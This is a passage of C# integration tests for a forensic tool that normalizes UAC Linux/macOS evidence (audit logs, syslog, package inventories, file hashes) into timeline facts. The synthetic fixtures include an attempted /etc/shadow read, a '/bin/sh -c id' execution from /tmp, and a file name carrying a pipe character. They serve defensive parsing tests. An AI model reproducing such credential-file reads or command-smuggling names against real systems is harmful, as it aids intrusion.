                    "type=AVC msg=audit(1700000002.789:44): avc: denied { read open } for pid=901 comm=\"bash\" path=\"/etc/shadow\" scontext=user_u:user_r:user_t:s0 tcontext=system_u:object_r:shadow_t:s0 tclass=file\r\n",
                    new UTF8Encoding(false));
                File.WriteAllText(Path.Combine(auditDir, "audit.log.corrupt"),
                    "this is not an audit event\r\n" +
                    "type=SYSCALL missing-msg-and-event-id\r\n",
                    new UTF8Encoding(false));
                using (var compressedFile = new FileStream(
                    Path.Combine(auditDir, "audit.log.1.gz"), FileMode.Create,
                    FileAccess.Write, FileShare.None))
                using (var compressed = new GZipStream(compressedFile, CompressionMode.Compress))
                using (var writer = new StreamWriter(compressed, new UTF8Encoding(false)))
                {
                    writer.WriteLine("type=USER_AUTH msg=audit(1700000003.100:45): pid=112 uid=0 auid=1001 ses=9 msg='op=PAM:authentication acct=\"bob\" exe=\"/usr/sbin/sshd\" hostname=failed.example addr=203.0.113.55 terminal=ssh res=failed'");
                }

                CaseData c = CaseManager.LoadCaseFromFolder(dir);
                if (c == null || c.UacEvidence == null || !c.UacEvidence.IsUac)
                    throw new InvalidOperationException("UAC audit evidence was not detected.");

                string csvPath = CaseManager.ResolveArtifactPath(c, ArtifactNames.UacAuditEventsCsv);
                if (!File.Exists(csvPath))
                    throw new InvalidOperationException("UAC audit canonical CSV was not created.");
                List<Dictionary<string, string>> rows = CorrelationCsvHelper.ReadCsv(csvPath);
                Dictionary<string, string> exec = rows.FirstOrDefault(x =>
                    string.Equals(CorrelationCsvHelper.Get(x, "AuditEventId"),
                        "1700000000.123:42", StringComparison.Ordinal));
                if (exec == null)
                    throw new InvalidOperationException("Compound EXECVE audit event was not emitted.");
                if (!string.Equals(CorrelationCsvHelper.Get(exec, "Action"),
                        "ProcessExecutionObserved", StringComparison.Ordinal) ||
                    !string.Equals(CorrelationCsvHelper.Get(exec, "CommandLine"),
                        "/bin/sh -c id", StringComparison.Ordinal) ||
                    !string.Equals(CorrelationCsvHelper.Get(exec, "WorkingDirectory"),
                        "/tmp", StringComparison.Ordinal) ||
                    CorrelationCsvHelper.Get(exec, "TargetPaths").IndexOf(
                        "/tmp/payload.sh", StringComparison.Ordinal) < 0 ||
                    CorrelationCsvHelper.Get(exec, "TargetPaths").IndexOf(
                        "/tmp/pay\\|load.sh", StringComparison.Ordinal) < 0 ||
                    CorrelationCsvHelper.Get(exec, "RecordTypes").IndexOf(
                        "EXECVE", StringComparison.Ordinal) < 0 ||
                    !string.Equals(CorrelationCsvHelper.Get(exec, "TimeUtc"),
                        "2023-11-14T22:13:20.1230000Z", StringComparison.Ordinal))
                    throw new InvalidOperationException("Compound audit fields were not merged: " +
                        string.Join(" | ", exec.Select(x => x.Key + "=" + x.Value).ToArray()));

                Dictionary<string, string> login = rows.FirstOrDefault(x =>
                    string.Equals(CorrelationCsvHelper.Get(x, "AuditEventId"),
                        "1700000001.456:43", StringComparison.Ordinal));
                if (login == null ||
                    !string.Equals(CorrelationCsvHelper.Get(login, "Action"),
                        "LoginSucceeded", StringComparison.Ordinal) ||
                    !string.Equals(CorrelationCsvHelper.Get(login, "User"),
                        "alice", StringComparison.Ordinal) ||
                    !string.Equals(CorrelationCsvHelper.Get(login, "RemoteAddress"),
                        "198.51.100.7", StringComparison.Ordinal))
                    throw new InvalidOperationException("Nested USER_LOGIN fields were not normalized.");

                Dictionary<string, string> avc = rows.FirstOrDefault(x =>
                    string.Equals(CorrelationCsvHelper.Get(x, "AuditEventId"),
                        "1700000002.789:44", StringComparison.Ordinal));
                if (avc == null ||
                    !string.Equals(CorrelationCsvHelper.Get(avc, "Action"),
                        "AccessControlDecisionObserved", StringComparison.Ordinal) ||
                    !string.Equals(CorrelationCsvHelper.Get(avc, "SELinuxDecision"),
                        "denied", StringComparison.Ordinal) ||
                    CorrelationCsvHelper.Get(avc, "TargetPaths").IndexOf(
                        "/etc/shadow", StringComparison.Ordinal) < 0)
                    throw new InvalidOperationException("SELinux AVC event was not normalized.");

                string evidenceIndex = File.ReadAllText(CaseManager.ResolveArtifactPath(c, ArtifactNames.UacEvidenceIndexCsv));
                string[] evidenceRows = evidenceIndex.Split(new string[] { "\r\n", "\n" },
                    StringSplitOptions.RemoveEmptyEntries);
                string validAudit = evidenceRows.FirstOrDefault(x =>
                    x.IndexOf("audit.log\"", StringComparison.OrdinalIgnoreCase) >= 0);
                if (string.IsNullOrEmpty(validAudit) ||
                    validAudit.IndexOf("\"normalized-source\"", StringComparison.Ordinal) < 0)
                    throw new InvalidOperationException("Valid audit log was not marked normalized-source.");
                string corruptAudit = evidenceRows.FirstOrDefault(x =>
                    x.IndexOf("audit.log.corrupt", StringComparison.OrdinalIgnoreCase) >= 0);
                if (string.IsNullOrEmpty(corruptAudit) ||
                    corruptAudit.IndexOf("\"indexed-raw\"", StringComparison.Ordinal) < 0)
                    throw new InvalidOperationException("Malformed audit log was not retained as indexed-raw.");
                string compressedAudit = evidenceRows.FirstOrDefault(x =>
                    x.IndexOf("audit.log.1.gz", StringComparison.OrdinalIgnoreCase) >= 0);
                if (string.IsNullOrEmpty(compressedAudit) ||
                    compressedAudit.IndexOf("\"normalized-source\"", StringComparison.Ordinal) < 0)
                    throw new InvalidOperationException("Valid gzip audit log was not marked normalized-source.");

                FactStore store = FactStore.BuildFromCase(c);
                Fact execFact = store.Facts.FirstOrDefault(x =>
                    x.Source == UacAuditEventNormalizer.SourceName &&
                    string.Equals(x.Action, "ProcessExecutionObserved", StringComparison.Ordinal) &&
                    HasEntity(x, "AuditEventId", "1700000000.123:42"));
                if (execFact == null ||
                    !HasEntity(execFact, "Path", "/usr/bin/bash") ||
                    !HasEntity(execFact, "Path", "/tmp/payload.sh") ||
                    !HasEntity(execFact, "Path", "/tmp/pay|load.sh") ||
                    !HasEntity(execFact, "AuditUserId", "1000") ||
                    !HasEntity(execFact, "ParentProcessId", "900"))
                    throw new InvalidOperationException("Audit execution fact entities were incomplete.");

                Fact loginFact = store.Facts.FirstOrDefault(x =>
                    x.Source == UacAuditEventNormalizer.SourceName &&
                    string.Equals(x.Action, "LoginSucceeded", StringComparison.Ordinal) &&
                    HasEntity(x, "User", "alice") &&
                    HasEntity(x, "RemoteIP", "198.51.100.7"));
                if (loginFact == null || loginFact.Time.Year != 2023)
                    throw new InvalidOperationException("Audit login fact was not emitted with event time.");
                Fact failedAuthFact = store.Facts.FirstOrDefault(x =>
                    x.Source == UacAuditEventNormalizer.SourceName &&
                    string.Equals(x.Action, "AuthenticationFailed", StringComparison.Ordinal) &&
                    HasEntity(x, "User", "bob") &&
                    HasEntity(x, "RemoteIP", "203.0.113.55"));
                if (failedAuthFact == null)
                    throw new InvalidOperationException("Compressed audit authentication fact was not emitted.");
                return true;
            }
            catch (Exception ex)
            {
                throw new InvalidOperationException("UAC audit integration test failed: " +
                    (ex.Message ?? ""), ex);
            }
            finally
            {
                TryDeleteDir(dir);
            }
        }

        private static bool AnalyzeFolder_uac_system_logs_parse_rfc_formats_without_inventing_time()
        {
            string dir = Path.Combine(Path.GetTempPath(), "ircol_uac_syslog_" + Guid.NewGuid().ToString("N"));
            try
            {
                string linuxLogDir = Path.Combine(dir, "[root]", "var", "log");
                string macLogDir = Path.Combine(dir, "[root]", "private", "var", "log");
                Directory.CreateDirectory(linuxLogDir);
                Directory.CreateDirectory(macLogDir);
                File.WriteAllText(Path.Combine(dir, "uac.log"),
                    "2026-07-28 10:00:00 +0800 INF Unix-like Artifacts Collector\r\n" +
                    "2026-07-28 10:00:00 +0800 INF Operating system: linux\r\n" +
                    "2026-07-28 10:00:00 +0800 INF Hostname: UAC-SYSLOG-01\r\n",
                    new UTF8Encoding(false));

                File.WriteAllText(Path.Combine(linuxLogDir, "syslog"),
                    "<34>1 2026-07-28T01:02:03.123456+00:00 host1 sshd 123 ID47 [exampleSDID@32473 iut=\"3\" eventSource=\"Application\"] Accepted publickey for alice\r\n" +
                    "2026-07-28T09:02:05+08:00 host1 app[77]: completed task\r\n" +
                    "<13>Jul 28 09:02:04 host1 kernel[42]: device attached\r\n" +
                    "2026-07-28T09:02:07+08:00 host1 longmsg[88]: " +
                    new string('x', 5000) + "\r\n",
                    new UTF8Encoding(false));
                File.WriteAllText(Path.Combine(macLogDir, "system.log"),
                    "Jul 28 09:03:04 mac1 loginwindow[100] <Notice>: session opened\r\n",
                    new UTF8Encoding(false));
                File.WriteAllText(Path.Combine(linuxLogDir, "kern.log.bad"),
                    "this line has no supported timestamp or syslog envelope\r\n",
                    new UTF8Encoding(false));
                File.WriteAllText(Path.Combine(linuxLogDir, "auth.log"),
                    "Jul 28 09:04:05 host1 sshd[222]: Accepted publickey for bob from 203.0.113.10 port 22 ssh2\r\n",
                    new UTF8Encoding(false));
                using (var compressedFile = new FileStream(
                    Path.Combine(linuxLogDir, "messages.1.gz"), FileMode.Create,
                    FileAccess.Write, FileShare.None))
                using (var compressed = new GZipStream(compressedFile, CompressionMode.Compress))
                using (var writer = new StreamWriter(compressed, new UTF8Encoding(false)))
                {
                    writer.WriteLine("<30>1 2026-07-28T01:02:06Z host1 daemon 55 MSG - service ready");
                }

                CaseData c = CaseManager.LoadCaseFromFolder(dir);
                if (c == null || c.UacEvidence == null || !c.UacEvidence.IsUac)
                    throw new InvalidOperationException("UAC system-log evidence was not detected.");

                string csvPath = CaseManager.ResolveArtifactPath(c, ArtifactNames.UacSystemLogEventsCsv);
                if (!File.Exists(csvPath))
                    throw new InvalidOperationException("UAC system-log canonical CSV was not created.");
                List<Dictionary<string, string>> rows = CorrelationCsvHelper.ReadCsv(csvPath);
                if (rows.Count != 6)
                    throw new InvalidOperationException("Unexpected system-log row count: " +
                        rows.Count.ToString(CultureInfo.InvariantCulture));

                Dictionary<string, string> rfc5424 = rows.FirstOrDefault(x =>
                    string.Equals(CorrelationCsvHelper.Get(x, "MessageId"), "ID47",
                        StringComparison.Ordinal));
                if (rfc5424 == null ||
                    !string.Equals(CorrelationCsvHelper.Get(rfc5424, "TimeUtc"),
                        "2026-07-28T01:02:03.1234560Z", StringComparison.Ordinal) ||
                    !string.Equals(CorrelationCsvHelper.Get(rfc5424, "Facility"),
                        "auth", StringComparison.Ordinal) ||
                    !string.Equals(CorrelationCsvHelper.Get(rfc5424, "Severity"),
                        "crit", StringComparison.Ordinal) ||
                    CorrelationCsvHelper.Get(rfc5424, "Details").IndexOf(
                        "structured_data=", StringComparison.Ordinal) < 0)
                    throw new InvalidOperationException("RFC5424 fields were not normalized.");

                Dictionary<string, string> iso = rows.FirstOrDefault(x =>
                    string.Equals(CorrelationCsvHelper.Get(x, "Program"), "app",
                        StringComparison.Ordinal));
                if (iso == null ||
                    !string.Equals(CorrelationCsvHelper.Get(iso, "TimeUtc"),
                        "2026-07-28T01:02:05.0000000Z", StringComparison.Ordinal) ||
                    !string.Equals(CorrelationCsvHelper.Get(iso, "ProcessId"),
                        "77", StringComparison.Ordinal))
                    throw new InvalidOperationException("ISO system-log fields were not normalized.");

                Dictionary<string, string> truncated = rows.FirstOrDefault(x =>
                    string.Equals(CorrelationCsvHelper.Get(x, "Program"), "longmsg",
                        StringComparison.Ordinal));
                if (truncated == null ||
                    CorrelationCsvHelper.Get(truncated, "Message").Length != 4096 ||
                    CorrelationCsvHelper.Get(truncated, "Details").IndexOf(
                        "message_truncated=true", StringComparison.Ordinal) < 0)
                    throw new InvalidOperationException("Long system-log message was not bounded with provenance.");

                Dictionary<string, string> yearless = rows.FirstOrDefault(x =>
                    string.Equals(CorrelationCsvHelper.Get(x, "Program"), "kernel",
                        StringComparison.Ordinal));
                if (yearless == null ||
                    !string.IsNullOrEmpty(CorrelationCsvHelper.Get(yearless, "TimeUtc")) ||
                    !string.Equals(CorrelationCsvHelper.Get(yearless, "TimeParseStatus"),
                        "local-time-year-and-offset-unavailable", StringComparison.Ordinal) ||
                    !string.Equals(CorrelationCsvHelper.Get(yearless, "Facility"),
                        "user", StringComparison.Ordinal) ||
                    !string.Equals(CorrelationCsvHelper.Get(yearless, "Severity"),
                        "notice", StringComparison.Ordinal))
                    throw new InvalidOperationException("RFC3164 time/PRI safeguards were not preserved.");

                if (rows.Any(x => CorrelationCsvHelper.Get(x, "SourcePath").IndexOf(
                    "auth.log", StringComparison.OrdinalIgnoreCase) >= 0))
                    throw new InvalidOperationException("auth.log was duplicated into generic system-log rows.");

                string evidenceIndex = File.ReadAllText(CaseManager.ResolveArtifactPath(c, ArtifactNames.UacEvidenceIndexCsv));
                string[] evidenceRows = evidenceIndex.Split(new string[] { "\r\n", "\n" },
                    StringSplitOptions.RemoveEmptyEntries);
                string validSyslog = evidenceRows.FirstOrDefault(x =>
                    x.IndexOf("/syslog\"", StringComparison.OrdinalIgnoreCase) >= 0);
                if (string.IsNullOrEmpty(validSyslog) ||
                    validSyslog.IndexOf("\"normalized-source\"", StringComparison.Ordinal) < 0)
                    throw new InvalidOperationException("Valid syslog was not marked normalized-source.");
                string compressedLog = evidenceRows.FirstOrDefault(x =>
                    x.IndexOf("messages.1.gz", StringComparison.OrdinalIgnoreCase) >= 0);
                if (string.IsNullOrEmpty(compressedLog) ||
                    compressedLog.IndexOf("\"normalized-source\"", StringComparison.Ordinal) < 0)
                    throw new InvalidOperationException("Valid gzip system log was not marked normalized-source.");
                string corruptLog = evidenceRows.FirstOrDefault(x =>
                    x.IndexOf("kern.log.bad", StringComparison.OrdinalIgnoreCase) >= 0);
                if (string.IsNullOrEmpty(corruptLog) ||
                    corruptLog.IndexOf("\"indexed-raw\"", StringComparison.Ordinal) < 0)
                    throw new InvalidOperationException("Unsupported system-log lines were not retained as indexed-raw.");

                FactStore store = FactStore.BuildFromCase(c);
                Fact timed = store.Facts.FirstOrDefault(x =>
                    x.Source == UacSystemLogNormalizer.SourceName &&
                    HasEntity(x, "ProgramName", "sshd") &&
                    HasEntity(x, "ProcessId", "123") &&
                    HasEntity(x, "Computer", "host1"));
                if (timed == null || timed.Time.Year != 2026 ||
                    timed.Details.IndexOf("Accepted publickey", StringComparison.Ordinal) < 0)
                    throw new InvalidOperationException("Timed system-log fact was not emitted.");

                Fact untimed = store.Facts.FirstOrDefault(x =>
                    x.Source == UacSystemLogNormalizer.SourceName &&
                    HasEntity(x, "ProgramName", "kernel"));
                if (untimed == null || untimed.Time != DateTime.MinValue ||
                    !untimed.FallbackUsed ||
                    untimed.ParserNote.IndexOf("no UTC value was invented",
                        StringComparison.OrdinalIgnoreCase) < 0)
                    throw new InvalidOperationException("Yearless system-log fact invented a timeline time.");
                return true;
            }
            catch (Exception ex)
            {
                throw new InvalidOperationException("UAC system-log integration test failed: " +
                    (ex.Message ?? ""), ex);
            }
            finally
            {
                TryDeleteDir(dir);
            }
        }

        private static bool AnalyzeFolder_uac_packages_normalize_inventory_and_time_semantics()
        {
            string dir = Path.Combine(Path.GetTempPath(), "ircol_uac_packages_" +
                Guid.NewGuid().ToString("N"));
            string untimedDir = Path.Combine(Path.GetTempPath(), "ircol_uac_packages_untimed_" +
                Guid.NewGuid().ToString("N"));
            try
            {
                string packages = Path.Combine(dir, "live_response", "packages");
                Directory.CreateDirectory(packages);
                File.WriteAllText(Path.Combine(dir, "uac.log"),
                    "2026-07-28 10:00:00 +0800 INF Unix-like Artifacts Collector\r\n" +
                    "2026-07-28 10:00:00 +0800 INF Operating system: linux\r\n" +
                    "2026-07-28 10:00:00 +0800 INF Hostname: UAC-PACKAGES-01\r\n",
                    new UTF8Encoding(false));
                File.WriteAllText(Path.Combine(packages, "dpkg_-l.txt"),
                    "Desired=Unknown/Install/Remove/Purge/Hold\r\n" +
                    "||/ Name Version Architecture Description\r\n" +
                    "+++-==================-==================-============-================\r\n" +
                    "ii  openssh-server 1:9.2p1-2+deb12u5 amd64 " +
                    new string('d', 3000) + "\r\n" +
                    "rc  telnet 0.17-41 amd64 legacy client\r\n",
                    new UTF8Encoding(false));
                File.WriteAllText(Path.Combine(packages,
                    "rpm_-q_-a_--queryformat_installtime_name_version_release.txt"),
                    "1722140000~bash~5.2.26-3.el9\r\n",
                    new UTF8Encoding(false));
                File.WriteAllText(Path.Combine(packages, "dnf_list_installed.txt"),
                    "Installed Packages\r\n" +
                    "Warning: repository metadata is stale\r\n" +
                    "audit.x86_64 3.1.5-1.el9 @System\r\n",
                    new UTF8Encoding(false));
                File.WriteAllText(Path.Combine(packages, "pacman_-Q_-m.txt"),
                    "custom-agent 1.2.3-1\r\n",
                    new UTF8Encoding(false));
                File.WriteAllText(Path.Combine(packages, "apk_info_-vv.txt"),
                    "busybox-1.36.1-r2 - Size optimized toolbox\r\n",
                    new UTF8Encoding(false));
                File.WriteAllText(Path.Combine(packages, "flatpak_list.txt"),
                    "Name\tApplication ID\tVersion\tBranch\tInstallation\r\n" +
                    "Calculator\torg.gnome.Calculator\t46.0\tstable\tsystem\r\n",
                    new UTF8Encoding(false));
                File.WriteAllText(Path.Combine(packages, "snap_list.txt"),
                    "Name Version Rev Tracking Publisher Notes\r\n" +
                    "core22 20240111 1122 latest/stable canonical** base\r\n",
                    new UTF8Encoding(false));
                File.WriteAllText(Path.Combine(packages,
                    "brew_list_--versions_--multiple.txt"),
                    "wget 1.21.4 1.21.3\r\n",
                    new UTF8Encoding(false));

                CaseData c = CaseManager.LoadCaseFromFolder(dir);
                if (c == null || c.UacEvidence == null || !c.UacEvidence.IsUac)
                    throw new InvalidOperationException("UAC package evidence was not detected.");

                string csvPath = CaseManager.ResolveArtifactPath(c, ArtifactNames.UacPackagesCsv);
                if (!File.Exists(csvPath))
                    throw new InvalidOperationException("UAC package canonical CSV was not created.");
                List<Dictionary<string, string>> rows =
                    CorrelationCsvHelper.ReadCsv(csvPath);
                if (rows.Count != 10)
                    throw new InvalidOperationException("Unexpected UAC package row count: " +
                        rows.Count.ToString(CultureInfo.InvariantCulture));

                Dictionary<string, string> dpkg = rows.FirstOrDefault(x =>
                    string.Equals(CorrelationCsvHelper.Get(x, "Name"),
                        "openssh-server", StringComparison.Ordinal));
                if (dpkg == null ||
                    !string.Equals(CorrelationCsvHelper.Get(dpkg, "State"),
                        "installed", StringComparison.Ordinal) ||
                    !string.Equals(CorrelationCsvHelper.Get(dpkg, "Architecture"),
                        "amd64", StringComparison.Ordinal) ||
                    !string.Equals(CorrelationCsvHelper.Get(dpkg, "ObservedAtUtc"),
                        "2026-07-28T02:00:00.0000000Z", StringComparison.Ordinal) ||
                    CorrelationCsvHelper.Get(dpkg, "Description").Length != 2048 ||
                    CorrelationCsvHelper.Get(dpkg, "Details").IndexOf(
                        "canonical_field_truncated=true", StringComparison.Ordinal) < 0)
                    throw new InvalidOperationException("dpkg package fields were not normalized.");

                Dictionary<string, string> removed = rows.FirstOrDefault(x =>
                    string.Equals(CorrelationCsvHelper.Get(x, "Name"),
                        "telnet", StringComparison.Ordinal));
                if (removed == null ||
                    !string.Equals(CorrelationCsvHelper.Get(removed, "State"),
                        "removed-config-remains", StringComparison.Ordinal))
                    throw new InvalidOperationException("dpkg non-installed state was collapsed into installed.");

                Dictionary<string, string> rpm = rows.FirstOrDefault(x =>
                    string.Equals(CorrelationCsvHelper.Get(x, "Manager"),
                        "rpm", StringComparison.Ordinal));
                if (rpm == null ||
                    !string.Equals(CorrelationCsvHelper.Get(rpm, "InstallTimeUtc"),
                        "2024-07-28T04:13:20.0000000Z", StringComparison.Ordinal) ||
                    !string.Equals(CorrelationCsvHelper.Get(rpm, "InstallTimeParseStatus"),
                        "epoch-parsed", StringComparison.Ordinal))
                    throw new InvalidOperationException("RPM install epoch was not preserved.");

                Dictionary<string, string> dnf = rows.FirstOrDefault(x =>
                    string.Equals(CorrelationCsvHelper.Get(x, "Manager"),
                        "dnf", StringComparison.Ordinal));
                if (dnf == null ||
                    !string.Equals(CorrelationCsvHelper.Get(dnf, "Name"),
                        "audit", StringComparison.Ordinal) ||
                    !string.Equals(CorrelationCsvHelper.Get(dnf, "Architecture"),
                        "x86_64", StringComparison.Ordinal))
                    throw new InvalidOperationException("DNF name/architecture was not normalized.");

                Dictionary<string, string> flatpak = rows.FirstOrDefault(x =>
                    string.Equals(CorrelationCsvHelper.Get(x, "Manager"),
                        "flatpak", StringComparison.Ordinal));
                if (flatpak == null ||
                    !string.Equals(CorrelationCsvHelper.Get(flatpak, "Name"),
                        "org.gnome.Calculator", StringComparison.Ordinal) ||
                    !string.Equals(CorrelationCsvHelper.Get(flatpak, "Scope"),
                        "system", StringComparison.Ordinal))
                    throw new InvalidOperationException("Flatpak application identity was not normalized.");

                if (rows.Count(x => string.Equals(
                    CorrelationCsvHelper.Get(x, "Manager"), "brew",
                    StringComparison.Ordinal)) != 2)
                    throw new InvalidOperationException("Multiple Homebrew versions were not preserved.");

                string evidenceIndex = File.ReadAllText(CaseManager.ResolveArtifactPath(c,
                    ArtifactNames.UacEvidenceIndexCsv));
                string dpkgEvidence = evidenceIndex.Split(new string[] {
                    "\r\n", "\n" }, StringSplitOptions.RemoveEmptyEntries)
                    .FirstOrDefault(x => x.IndexOf("dpkg_-l.txt",
                        StringComparison.OrdinalIgnoreCase) >= 0);
                if (string.IsNullOrEmpty(dpkgEvidence) ||
                    dpkgEvidence.IndexOf("\"normalized-source\"",
                        StringComparison.Ordinal) < 0)
                    throw new InvalidOperationException("Package sources were not indexed as normalized.");

                FactStore store = FactStore.BuildFromCase(c);
                List<Fact> packageFacts = store.Facts.Where(x =>
                    x.Source == UacPackageNormalizer.SourceName).ToList();
                if (packageFacts.Count != 10)
                    throw new InvalidOperationException("Unexpected UAC package fact count.");

                Fact rpmFact = packageFacts.FirstOrDefault(x =>
                    HasEntity(x, "ProductName", "bash") &&
                    HasEntity(x, "ProductVersion", "5.2.26-3.el9") &&
                    HasEntity(x, "PackageManager", "rpm"));
                if (rpmFact == null ||
                    rpmFact.Action != "PackageInstallTimeRecorded" ||
                    rpmFact.TimeKind != FactTimeMetadata.MetadataTimeKind ||
                    rpmFact.Time.Year != 2024)
                    throw new InvalidOperationException("RPM package fact time semantics were not preserved.");

                Fact observedFact = packageFacts.FirstOrDefault(x =>
                    HasEntity(x, "ProductName", "openssh-server"));
                if (observedFact == null ||
                    observedFact.Action != "PackageStateObserved" ||
                    observedFact.TimeKind != FactTimeMetadata.ObservedTimeKind ||
                    observedFact.TimeConfidence != FactTimeMetadata.LowConfidence ||
                    observedFact.ParserNote.IndexOf("does not imply maliciousness",
                        StringComparison.OrdinalIgnoreCase) < 0)
                    throw new InvalidOperationException("Package state observation semantics were not preserved.");

                string untimedPackages = Path.Combine(untimedDir,
                    "live_response", "packages");
                Directory.CreateDirectory(untimedPackages);
                File.WriteAllText(Path.Combine(untimedDir, "uac.log"),
                    "2026-07-28 10:00:00 INF Unix-like Artifacts Collector\r\n",
                    new UTF8Encoding(false));
                File.WriteAllText(Path.Combine(untimedPackages, "pacman_-Q_-n.txt"),
                    "bash 5.2.037-1\r\n", new UTF8Encoding(false));
                CaseData untimedCase = CaseManager.LoadCaseFromFolder(untimedDir);
                Fact untimedFact = FactStore.BuildFromCase(untimedCase).Facts.FirstOrDefault(x =>
                    x.Source == UacPackageNormalizer.SourceName);
                if (untimedFact == null || untimedFact.Time != DateTime.MinValue ||
                    !untimedFact.FallbackUsed)
                    throw new InvalidOperationException("Offset-less UAC time was invented for package state.");
                return true;
            }
            catch (Exception ex)
            {
                throw new InvalidOperationException("UAC package integration test failed: " +
                    (ex.Message ?? ""), ex);
            }
            finally
            {
                TryDeleteDir(dir);
                TryDeleteDir(untimedDir);
            }
        }

        private static bool AnalyzeFolder_uac_file_hashes_normalize_multi_platform_formats()
        {
            string dir = Path.Combine(Path.GetTempPath(), "ircol_uac_hashes_" +
                Guid.NewGuid().ToString("N"));
            try
            {
                string executableDir = Path.Combine(dir, "hash_executables");
                string processDir = Path.Combine(dir, "live_response", "process");
                Directory.CreateDirectory(executableDir);
                Directory.CreateDirectory(processDir);
                File.WriteAllText(Path.Combine(dir, "uac.log"),
                    "2026-07-29 10:00:00 +0800 INF Unix-like Artifacts Collector\r\n" +
                    "2026-07-29 10:00:00 +0800 INF Operating system: linux\r\n" +
                    "2026-07-29 10:00:00 +0800 INF Hostname: UAC-HASH-01\r\n",
                    new UTF8Encoding(false));

                string sha256A = new string('A', 64);
                string sha256B = new string('b', 64);
                string sha256C = new string('c', 64);
                string sha256D = new string('2', 64);
                string md5A = new string('d', 32);
                string md5B = new string('e', 32);
                string sha1A = new string('f', 40);
                string executableHashes = Path.Combine(executableDir,
                    "hash_executables.sha256");
                File.WriteAllText(executableHashes,
                    sha256A + "  /usr/bin/bash\r\n" +
                    "SHA256 (/Applications/Evil Tool) = " + sha256B + "\r\n" +
                    "\\" + sha256C + "  /opt/weird\\\\name\\nscript\r\n" +
                    sha256D + "  *leading-star-name\r\n" +
                    new string('1', 40) + "  /wrong-algorithm\r\n",
                    new UTF8Encoding(false));
                File.WriteAllText(Path.Combine(processDir,
                    "hash_running_processes.md5"),
                    md5A + " */usr/sbin/sshd\r\n" +
                    "MD5 (/opt/agent with spaces) = " + md5B + "\r\n",
                    new UTF8Encoding(false));
                File.WriteAllText(Path.Combine(processDir,
                    "hash_running_processes.sha1"),
                    "SHA1(/bin/zsh)= " + sha1A + "\r\n",
                    new UTF8Encoding(false));

                string before = EvidenceManifest.ComputeSha256(executableHashes);
                CaseData c = CaseManager.LoadCaseFromFolder(dir);
                if (c == null || c.UacEvidence == null ||
                    !c.UacEvidence.IsUac)
                    throw new InvalidOperationException(
                        "UAC hash evidence was not detected.");

                string csvPath = CaseManager.ResolveArtifactPath(c,
                    ArtifactNames.UacFileHashesCsv);
                if (string.IsNullOrEmpty(csvPath) || !File.Exists(csvPath))
                    throw new InvalidOperationException(
                        "UAC file-hash canonical CSV was not created.");
                if (File.Exists(Path.Combine(dir,
                    ArtifactNames.UacFileHashesCsv)))
                    throw new InvalidOperationException(
                        "Canonical UAC file hashes were written into the evidence root.");
                if (!string.Equals(before,
                    EvidenceManifest.ComputeSha256(executableHashes),
                    StringComparison.OrdinalIgnoreCase))
                    throw new InvalidOperationException(
                        "UAC hash source changed during analysis.");

                List<Dictionary<string, string>> rows =
                    CorrelationCsvHelper.ReadCsv(csvPath);
                if (rows.Count != 7)
                    throw new InvalidOperationException(
                        "Unexpected UAC file-hash row count: " +
                        rows.Count.ToString(CultureInfo.InvariantCulture));

                Dictionary<string, string> bash = rows.FirstOrDefault(x =>
                    string.Equals(CorrelationCsvHelper.Get(x, "Path"),
                        "/usr/bin/bash", StringComparison.Ordinal));
                if (bash == null ||
                    !string.Equals(CorrelationCsvHelper.Get(bash, "Hash"),
                        sha256A.ToLowerInvariant(), StringComparison.Ordinal) ||
                    !string.Equals(CorrelationCsvHelper.Get(bash, "SourceKind"),
                        "executable-inventory", StringComparison.Ordinal))
                    throw new InvalidOperationException(
                        "GNU checksum output was not normalized.");

                Dictionary<string, string> bsd = rows.FirstOrDefault(x =>
                    string.Equals(CorrelationCsvHelper.Get(x, "Path"),
                        "/Applications/Evil Tool", StringComparison.Ordinal));
                if (bsd == null ||
                    !string.Equals(CorrelationCsvHelper.Get(bsd, "InputFormat"),
                        "named-digest", StringComparison.Ordinal))
                    throw new InvalidOperationException(
                        "BSD/OpenSSL digest output was not normalized.");

                Dictionary<string, string> escaped = rows.FirstOrDefault(x =>
                    string.Equals(CorrelationCsvHelper.Get(x, "Hash"),
                        sha256C, StringComparison.Ordinal));
                if (escaped == null ||
                    CorrelationCsvHelper.Get(escaped, "Path").IndexOf(
                        "\\n", StringComparison.Ordinal) < 0 ||
                    CorrelationCsvHelper.Get(escaped, "Path").IndexOf(
                        "\\\\", StringComparison.Ordinal) >= 0)
                    throw new InvalidOperationException(
                        "Escaped checksum path did not remain single-row safe.");
                if (!rows.Any(x => string.Equals(
                    CorrelationCsvHelper.Get(x, "Hash"), sha256D,
                    StringComparison.Ordinal) && string.Equals(
                    CorrelationCsvHelper.Get(x, "Path"),
                    "*leading-star-name", StringComparison.Ordinal)))
                    throw new InvalidOperationException(
                        "A leading star in a text-mode file name was lost.");

                string evidenceIndexPath = CaseManager.ResolveArtifactPath(c,
                    ArtifactNames.UacEvidenceIndexCsv);
                List<Dictionary<string, string>> evidenceRows =
                    CorrelationCsvHelper.ReadCsv(evidenceIndexPath);
                List<Dictionary<string, string>> hashSources = evidenceRows
                    .Where(x => string.Equals(
                        CorrelationCsvHelper.Get(x, "Category"), "FileHash",
                        StringComparison.Ordinal))
                    .ToList();
                if (hashSources.Count != 3 || hashSources.Any(x =>
                    !string.Equals(CorrelationCsvHelper.Get(x,
                        "AnalysisStatus"), "normalized-source",
                        StringComparison.Ordinal)))
                    throw new InvalidOperationException(
                        "UAC hash sources were not indexed as normalized.");

                FactStore store = FactStore.BuildFromCase(c);
                List<Fact> facts = store.Facts.Where(x =>
                    x.Source == UacFileHashNormalizer.SourceName).ToList();
                if (facts.Count != 7)
                    throw new InvalidOperationException(
                        "Unexpected UAC file-hash fact count.");
                Fact sshd = facts.FirstOrDefault(x =>
                    HasEntity(x, "Hash", md5A) &&
                    HasEntity(x, "Path", "/usr/sbin/sshd") &&
                    HasEntity(x, "HashAlgorithm", "md5"));
                if (sshd == null || sshd.Time != DateTime.MinValue ||
                    sshd.TimeKind != FactTimeMetadata.UnknownTimeKind ||
                    !sshd.FallbackUsed ||
                    sshd.CollectionStep != "Execution Artifacts" ||
                    sshd.CollectionStatus != "imported" ||
                    sshd.ParseLevel != FactProvenanceMetadata.StructuredParseLevel ||
                    sshd.ParserNote.IndexOf("does not imply maliciousness",
                        StringComparison.OrdinalIgnoreCase) < 0)
                    throw new InvalidOperationException(
                        "UAC file-hash fact semantics were not preserved.");
                if (!c.LoadWarnings.Any(x => x.IndexOf(
                    "unsupported, mismatched, or oversized line",
                    StringComparison.OrdinalIgnoreCase) >= 0))
